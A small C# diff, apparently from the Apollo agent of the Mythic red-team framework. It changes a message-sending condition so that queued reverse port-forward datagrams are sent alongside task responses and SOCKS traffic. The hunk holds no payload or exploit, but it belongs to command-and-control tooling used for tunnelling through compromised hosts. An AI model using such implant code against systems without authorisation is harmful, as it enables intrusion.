@@ -391,7 +391,7 @@ namespace Apollo
             PortFwdDatagram[] rdatagrams = RPortFwdController.GetMythicMessagesFromQueue();
             SocksDatagram[] datagrams = SocksController.GetMythicMessagesFromQueue();
             List<ApolloTaskResponse> lResponses = new List<ApolloTaskResponse>(); // probably should be used to resend
-            if (responses.Length > 0 || datagrams.Length > 0)
+            if (responses.Length > 0 || datagrams.Length > 0 || rdatagrams.Length > 0)
             {
                 string guid = Guid.NewGuid().ToString();
                 while (retryCount < MAX_RETRIES)
